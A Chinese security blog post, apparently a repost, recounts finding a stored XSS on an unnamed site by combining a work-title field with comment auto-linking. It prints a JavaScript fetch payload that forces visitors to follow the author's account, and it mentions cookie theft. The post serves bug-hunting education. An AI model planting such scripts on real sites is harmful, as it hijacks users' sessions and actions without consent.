#  记一次有趣的XSS漏洞挖掘  
xiaoqiuxx
                    xiaoqiuxx  陌笙不太懂安全   2026-03-04 09:39  
  
免责声明  
```
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```  
```
作者:xiaoqiuxx
原文链接:https://xz.aliyun.com/news/13303
```  
  
漏洞复现  
  
功能点一  
  
首先这里的话是存在一个简单的功能点，就是可以发布自己的一个作品，这里挖掘的时候想法肯定就是插一些xss的payload（因为我们就是挖掘xss嘛），所以的话就插了一些payload进行测试，意料之中，肯定是没有反应的。但是我们肯定是不能放弃的，因为在挖掘的时候很多漏洞可能是组合在一起产生的，所以我们可以多一些脑洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTRK7Rbr6SRpnbxWQmPYPuOphawvW6LMtzLK7s9ABqY8YJ3Io1O0Yia9LicaKIzo4DXmezTgUfY8icic9Z2Alw1FUqiavB1CPktcWBM/640?wx_fmt=png&from=appmsg "")  
  
这个name参数就是我们的作品名称。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQmRIWbLHq6ch4gIiaJONZJBP0zU1ibuC5sTxpVuOQbZ7bWZVUBzQy8yJS84LiaU9ubSpZrZFH2huu4mgABpwtcdbEqFC8pTe7kb8/640?wx_fmt=png&from=appmsg "")  
  
发出来的效果就是这么一回事。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRo6Zpl4b3LDQouOvg3n3MAQFydwxIZKSVqLZo02DWSIdYOXbhBSXUmliafJGCoKWls11Rr29J6afB2ky4gWcBVlJr31sXWQ6no/640?wx_fmt=png&from=appmsg "")  
  
然后呢，这里没有发现漏洞，那么我们继续测试其他的功能点。  
  
功能点二  
  
这个功能点也是很常见的功能，就是评论。评论区一般都是xss的高发区也是重点防护区。当然我们也是可以进行一个简单的payload测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQSeiaD7NmFKAtI4Zuq7bSmicUXCdhyksQXjst4CJwccbvCtKSS1v3W1FliaErK81MBrCoaQtlS3qzfznZ87wicJUQvicm8Yzy1w0Tk/640?wx_fmt=png&from=appmsg "")  
  
一样的没有任何反应，但是这里的话我在看别人的评论的时候就发现了一个好玩的事情，如果评论的时候，我们评论的内容是该网站的其他作品的链接，那么它会自动转换为该作品的名称，一个a标签（外站的链接不行）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSqaLM7kQyvXG80XgBz3NM93jxepriaPp6mdsS72jV6F5R9oQqH3G1t1dHThFCdIvlHSYlXDTeeCvhfECJTqBKl6g6j72jIaG5s/640?wx_fmt=png&from=appmsg "")  
  
那么这里就是有思路了，把这两个功能点结合一下或许就可以变成一个有趣的xss漏洞。把之前我们存在xss payload的作品链接在我们的作品底下进行评论  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTyWibnceickNgw5Toy3IuLRlKndcfDQl93W0nqbKDs8ibndkDXlqO02ic335wUrlm1jJ6Eib3icezSK4gNfpst4VvWvXkjY1giaMIP9w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ2hZxE41u47cSYbbibpaibYZ0R1yTWcKiaN21iarnbDUN2ttibgiaFJKibwAbB2TN8FFic4ZZETPc3cpeFRdMXYsKKS2NGZEQ0hchU4aw/640?wx_fmt=png&from=appmsg "")  
  
好！符合预期，这里确实存在xss漏洞，那么我们如何把这个危害进行扩大呢，我们都知道xss主要是因为js的问题，而js是可以发起http请求的，那么这里我们就有一个思路了（当时也是看了大佬挖掘b站xss漏洞的启发），我们抓取api，然后自己编写一段请求代码，只要别人访问我们的作品（或者我们在别人作品底下进行评论），都会触发这段js代码从而发起请求。借助一些xss在线平台，编写以下代码，通过fetch发起请求，让其他用户自动关注我的账号。  
```
function getHeaders() {
      return {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-site",
        "Content-Type": 'application/json'
      };
    }
    function apiGet() {
      return fetch("https://xxxxxxx/follow", {
        method: "POST",
        headers: getHeaders(),
        mode: "cors",
        body: JSON.stringify({
          "followed_user_id": xxxxxx,
          "state": 1
        })
      }).then(function () {
        console.log("关注成功");
      })
    }
    apiGet()
```  
  
在其他作品底下进行评论  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboThiaic6ylONmd7kYfuRUEmeG0uUvxnFjjr40ExesQs7uxYuhjBRfnibwwSfTKN8ia5P01m13JMkZSwI6eE6lmKqx8ds5Kgpc0C9so/640?wx_fmt=png&from=appmsg "")  
  
抓包可以看到确实是已经发起请求了，那么坐等消息即可（狗头）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTqS6icVATBiagDHr5sbTqQIzbbU1eibWj7icUA1MJewtkj6onwjfbLsXg4KDNB7hiazEiccHZA9lrVxWNb9DfbrujicO5wXSuctm4Qwc/640?wx_fmt=png&from=appmsg "")  
  
可以的，百万关注不是梦啊，这里其实可以借助xss平台进行更多的操作，比如盗取cookie...  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRdwFksW75BVwNgOaJx1F28TeicWg0jyXGb9d3WwI4wdM2zrO6iaOs8NDicKY9W1BcngZZ3lY8CoLjibURzw5rPcNXrs1JHYtFyT1U/640?wx_fmt=png&from=appmsg "")  
  
  
总结  
  
在挖掘一些漏洞的时候我们的思路需要发散一些，碰到功能点我们可以去思考开发者开发这个功能是想实现什么东西，多个不同的功能点是不是组合在一些会产生一些特殊的化学反应。  
  
  
后台回复  
加群  
加入交流群              
  
有思路工具需要的师傅可以加入  
小圈子  
                                     
  
主要内容是（2025-2026/edusrc实战报告/思维导图/edu资产/漏洞挖掘工具/各类源码/ctf&src学习资料等）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTQLW5X2q5ibOoTBfZeBTd8b8fCht2b9CSdmibG305NblA0TPI3kg3D8K02iaPBSEU3zpicppUFr1KrMuCWtpRIOiapFrl5J0HLV1vY/640?wx_fmt=png&from=appmsg "")  
  
部分思维导图展示，其他内容可扫码查看。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MSDUaqtwboQ0vRSQfUtaGWJ7K28K3QafSEib6NpRQTVCQCcq5qqicnzibv4cqoEEZ6cDzDaOTofjskmRMIozbRC68RgX5CBYicIJOtiayQeTT4PQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/MSDUaqtwboQibpWs0DjVyrica7aQ69miaHcL2g62EeroFVERMbljhHgtJADKmZa2CxiaHhBDM1Afdib1wUn2C4LD2J3T9qqNTRvt7WG2cnmMxE3M/640?wx_fmt=jpeg&from=appmsg "")  
  
其他内容懂得都懂，可以扫码查看详情，目前410多条内容，持续更新中。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboSbY9iaDZ9UMr1zGr1VJPNmGbiadDGnY2UoCOmicw9g7CbWt5HOKNKiamG6Cr6cK3eicHSjfNibRibS9Ksqz5zIF4nVWnWtY7bMAS7bFU/640?wx_fmt=jpeg&from=appmsg "")  
  
